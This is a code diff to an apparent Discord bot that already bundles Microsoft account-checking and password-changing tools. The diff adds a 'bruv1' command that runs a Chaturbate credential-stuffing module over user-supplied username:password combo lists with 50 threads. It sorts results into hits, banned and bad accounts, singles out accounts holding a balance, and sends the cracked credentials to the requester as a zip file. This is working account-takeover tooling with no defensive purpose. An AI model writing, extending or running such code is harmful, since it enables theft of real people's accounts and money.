@@ -17,6 +17,7 @@ const { checkRefundAccounts } = require("./utils/microsoft-refund");
 const { checkInboxAccounts, getServiceCount } = require("./utils/microsoft-inbox");
 const { runCountrySort } = require("./utils/microsoft-countrysort");
 const { changePasswords } = require("./utils/microsoft-changer");
+const { bruteAccounts } = require("./utils/chaturbate-bruter");
 const { loadProxies, isProxyEnabled, getProxyCount, getProxyStats } = require("./utils/proxy-manager");
 const blacklist = require("./utils/blacklist");
 const { setWlids, getWlids, getWlidCount } = require("./utils/wlid-store");
@@ -40,6 +41,8 @@ const {
   countrySortResultsEmbed,
   changerProgressEmbed,
   changerFinalEmbed,
+  bruterProgressEmbed,
+  bruterFinalEmbed,
   rewardsResultsEmbed,
   refundProgressEmbed,
   refundResultsEmbed,
@@ -95,7 +98,7 @@ function isOwner(userId) {
 // ── Channel enforcement ──────────────────────────────────────
 
 const PULLER_CHECKER_CMDS = new Set(["pull", "promopuller", "check", "checker", "claim"]);
-const INBOX_NORMAL_CMDS = new Set(["inboxaio", "countrysort", "rewards", "help", "stats", "wlidset", "refund", "netflix", "steam", "xboxchk", "aio", "change"]);
+const INBOX_NORMAL_CMDS = new Set(["inboxaio", "countrysort", "rewards", "help", "stats", "wlidset", "refund", "netflix", "steam", "xboxchk", "aio", "change", "bruv1"]);
 
 function getRequiredChannel(cmd) {
   if (PULLER_CHECKER_CMDS.has(cmd)) return config.ALLOWED_CHANNEL_PULLER;
@@ -1093,6 +1096,104 @@ async function handleChange(respond, userId, newPassword, accountsRaw, accountsF
   }
 }
 
+// ── Chaturbate Bruter ───────────────────────────────────────
+
+async function handleBruv1(respond, userId, accountsRaw, accountsFile, threads = 50, dmUser = null) {
+  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
+
+  const acquire = limiter.acquire(userId, "bruv1");
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
+
+  const ac = new AbortController();
+  activeAborts.set(userId, ac);
+
+  try {
+    const combos = await gatherCombos(accountsRaw, accountsFile);
+    if (combos.length === 0) return respond({ embeds: [errorEmbed("No valid combos provided.")] });
+
+    const startTime = Date.now();
+    let hitCount = 0, badCount = 0, bannedCount = 0, retryCount = 0;
+
+    const msg = await respond({
+      embeds: [bruterProgressEmbed({ completed: 0, total: combos.length, hits: 0, bad: 0, banned: 0, retries: 0, elapsed: 0, username: dmUser?.username })],
+      components: [stopButton(userId)],
+      fetchReply: true,
+    });
+
+    let lastUpdate = Date.now();
+
+    const results = await bruteAccounts(
+      combos,
+      threads,
+      (done, total, r) => {
+        if (r) {
+          if (r.status === "HIT") hitCount++;
+          else if (r.status === "BAD") badCount++;
+          else if (r.status === "BANNED") bannedCount++;
+          else retryCount++;
+        }
+        const now = Date.now();
+        if (now - lastUpdate > 2500) {
+          lastUpdate = now;
+          updateProgress(msg, bruterProgressEmbed({
+            completed: done, total, hits: hitCount, bad: badCount, banned: bannedCount, retries: retryCount,
+            elapsed: Date.now() - startTime,
+            latestUser: r?.user || "",
+            latestStatus: r?.status || "...",
+            username: dmUser?.username,
+          }), userId);
+        }
+      },
+      ac.signal
+    );
+
+    const elapsed = Date.now() - startTime;
+
+    const hits = results.filter((r) => r.status === "HIT");
+    const banned = results.filter((r) => r.status === "BANNED");
+    const balanced = hits.filter((r) => r.balance > 0);
+
+    const zipEntries = [];
+    if (hits.length > 0) {
+      zipEntries.push({ name: "hits.txt", content: hits.map((r) => `${r.user}:${r.pass} | Balance: ${r.balance}`).join("\n") });
+    }
+    if (banned.length > 0) {
+      zipEntries.push({ name: "banned.txt", content: banned.map((r) => `${r.user}:${r.pass} | Balance: ${r.balance}`).join("\n") });
+    }
+    if (balanced.length > 0) {
+      zipEntries.push({ name: "balancedhits.txt", content: balanced.map((r) => `${r.user}:${r.pass} | Balance: ${r.balance}`).join("\n") });
+    }
+
+    const embed = bruterFinalEmbed({
+      total: results.length, hits: hits.length, bad: badCount, banned: banned.length,
+      retries: retryCount, balanced: balanced.length, elapsed, username: dmUser?.username,
+    });
+    if (ac.signal.aborted) embed.setDescription((embed.data.description || "") + "\n\n*Stopped -- partial results*");
+
+    const { buildZipBuffer } = require("./utils/zip-builder");
+    const zipBuffer = buildZipBuffer(zipEntries);
+    const zipFile = new AttachmentBuilder(zipBuffer, { name: "bruter_results.zip" });
+
+    if (dmUser) {
+      try {
+        await dmUser.send({ embeds: [embed], files: [zipFile] });
+        await msg.edit({ embeds: [infoEmbed("Chaturbate Bruter Complete", `Hits: ${hits.length} | Banned: ${banned.length} | Balanced: ${balanced.length}. Results sent to your DMs.`)], components: [] });
+      } catch {
+        await msg.edit({ embeds: [embed], files: [zipFile], components: [] });
+      }
+    } else {
+      await msg.edit({ embeds: [embed], files: [zipFile], components: [] });
+    }
+
+    statsManager.record(userId, "bruv1", hits.length);
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
+  } finally {
+    activeAborts.delete(userId);
+    limiter.release(userId);
+  }
+}
+
 // ── Admin Panel ─────────────────────────────────────────────
 
 async function handleAdminPanel(respond, callerId) {
@@ -1346,6 +1447,13 @@ client.on("interactionCreate", async (interaction) => {
         interaction.options.getAttachment("accounts_file"),
         interaction.options.getInteger("threads") || 3,
         user);
+    } else if (commandName === "bruv1") {
+      await interaction.deferReply();
+      await handleBruv1(respond, user.id,
+        interaction.options.getString("accounts"),
+        interaction.options.getAttachment("accounts_file"),
+        interaction.options.getInteger("threads") || 50,
+        user);
     } else if (commandName === "wlidset") {
       await handleWlidSet(respond, user.id,
         interaction.options.getString("wlids"),
@@ -1537,6 +1645,11 @@ client.on("messageCreate", async (message) => {
       const accountsRaw = args.slice(1).join(" ");
       if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.change <newpass> <email:pass>` or attach .txt with combos.")] });
       await handleChange(respond, message.author.id, newPassword, accountsRaw, attachment, 3, message.author);
+    } else if (cmd === "bruv1") {
+      const accountsRaw = args.join(" ");
+      const attachment = message.attachments.first();
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.bruv1 <user:pass>` or attach .txt with combos.")] });
+      await handleBruv1(respond, message.author.id, accountsRaw, attachment, 50, message.author);
     } else if (cmd === "wlidset") {
       const wlidsRaw = args.join(" ");
       const attachment = message.attachments.first();
